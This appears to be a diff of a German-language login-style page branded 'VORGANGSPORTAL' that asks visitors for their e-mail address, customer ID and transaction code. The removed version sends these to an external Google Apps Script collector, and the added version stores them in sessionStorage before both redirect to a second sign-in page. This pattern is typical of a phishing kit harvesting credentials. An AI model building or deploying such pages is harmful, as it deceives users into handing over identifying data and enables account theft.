@@ -3,167 +3,52 @@
 <html lang="de">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="viewport" content="width=device-width, initial-scale=1">
 <title>Vorgangsprüfung</title>
-
 <style>
-* {
-    box-sizing: border-box;
-}
-
-body {
-    margin: 0;
-    min-height: 100vh;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    background: #ffffff;
-    font-family: Arial, Helvetica, sans-serif;
-    color: #253044;
-}
-
-.container {
-    width: 100%;
-    max-width: 420px;
-    padding: 40px 35px;
-    background: #fff;
-    border: 1px solid #e5e8ed;
-    border-radius: 12px;
-    box-shadow: 0 5px 24px rgba(0,0,0,0.06);
-}
-
-.brand {
-    text-align: center;
-    font-size: 25px;
-    font-weight: bold;
-    margin-bottom: 28px;
-}
-
-h1 {
-    font-size: 23px;
-    margin-bottom: 12px;
-}
-
-.description {
-    font-size: 14px;
-    line-height: 1.5;
-    color: #626d7c;
-    margin-bottom: 25px;
-}
-
-label {
-    display: block;
-    font-size: 14px;
-    font-weight: 600;
-    margin-bottom: 8px;
-}
-
-input {
-    width: 100%;
-    height: 50px;
-    padding: 0 13px;
-    border: 1px solid #aeb8c5;
-    border-radius: 6px;
-    font-size: 16px;
-    margin-bottom: 20px;
-}
-
-button {
-    width: 100%;
-    height: 48px;
-    border: none;
-    border-radius: 25px;
-    background: #253044;
-    color: white;
-    font-size: 16px;
-    font-weight: bold;
-    cursor: pointer;
-}
-
-button:disabled {
-    opacity: 0.6;
-    cursor: wait;
-}
-
-.footer {
-    margin-top: 22px;
-    text-align: center;
-    font-size: 12px;
-    color: #89919d;
-}
+*{box-sizing:border-box}
+body{margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;background:#fff;font-family:Arial,sans-serif;color:#253044}
+.container{width:100%;max-width:420px;padding:40px 35px;border:1px solid #e5e8ed;border-radius:12px;box-shadow:0 5px 24px #0000000f}
+.brand{text-align:center;font-size:24px;font-weight:bold;margin-bottom:30px}
+h1{font-size:23px;margin:0 0 12px}
+p{font-size:14px;line-height:1.5;color:#626d7c;margin-bottom:25px}
+label{display:block;font-size:14px;font-weight:bold;margin-bottom:8px}
+input{width:100%;height:50px;padding:0 13px;border:1px solid #aeb8c5;border-radius:6px;font-size:16px;margin-bottom:20px}
+button{width:100%;height:48px;border:0;border-radius:25px;background:#253044;color:white;font-size:16px;font-weight:bold;cursor:pointer}
+.footer{text-align:center;font-size:12px;color:#89919d;margin-top:22px}
 </style>
 </head>
-
 <body>
-
 <main class="container">
+<div class="brand">VORGANGSPORTAL</div>
+<h1>Vorgangsprüfung</h1>
+<p>Bitte geben Sie Ihre E-Mail-Adresse und Kundenkennung ein, um fortzufahren.</p>
 
-    <div class="brand">VORGANGSPORTAL</div>
+<form id="form">
+<label for="email">E-Mail-Adresse</label>
+<input type="email" id="email" autocomplete="email" required>
 
-    <h1>Vorgang prüfen</h1>
+<label for="kundenkennung">Kundenkennung</label>
+<input type="text" id="kundenkennung" autocomplete="off" required>
 
-    <p class="description">
-        Bitte geben Sie Ihre Kundenkennung und Ihren Vorgangscode ein.
-    </p>
+<button type="submit">Weiter</button>
+</form>
 
-    <form id="testForm">
-
-        <label for="email">E-Mail-Adresse</label>
-        <input type="email" id="email" required>
-
-        <label for="kundenkennung">Kundenkennung</label>
-        <input type="text" id="kundenkennung" required>
-
-        <label for="vorgangscode">Vorgangscode</label>
-        <input type="text" id="vorgangscode" required>
-
-        <button type="submit" id="submitButton">
-            Weiter
-        </button>
-
-    </form>
-
-    <div class="footer">
-        Vorgangsverwaltung
-    </div>
-
+<div class="footer">Vorgangsverwaltung</div>
 </main>
 
 <script>
-const SCRIPT_URL = "DEINE_GOOGLE_APPS_SCRIPT_URL";
+document.getElementById("form").addEventListener("submit", function(e) {
+    e.preventDefault();
 
-document.getElementById("testForm").addEventListener("submit", async function(event) {
-    event.preventDefault();
+    const email = document.getElementById("email").value.trim();
+    const kundenkennung = document.getElementById("kundenkennung").value.trim();
 
-    const button = document.getElementById("submitButton");
-    button.disabled = true;
-    button.textContent = "Wird übermittelt...";
+    sessionStorage.setItem("test_email", email);
+    sessionStorage.setItem("test_kundenkennung", kundenkennung);
 
-    const data = {
-        email: document.getElementById("email").value,
-        kundenkennung: document.getElementById("kundenkennung").value,
-        vorgangscode: document.getElementById("vorgangscode").value
-    };
-
-    try {
-        await fetch(SCRIPT_URL, {
-            method: "POST",
-            mode: "no-cors",
-            headers: {
-                "Content-Type": "text/plain;charset=utf-8"
-            },
-            body: JSON.stringify(data)
-        });
-
-        window.location.href = "signin2.html";
-
-    } catch (error) {
-        button.disabled = false;
-        button.textContent = "Weiter";
-        alert("Die Übermittlung ist fehlgeschlagen. Bitte versuchen Sie es erneut.");
-    }
+    window.location.href = "signin2.html";
 });
 </script>
-
 </body>
 </html>
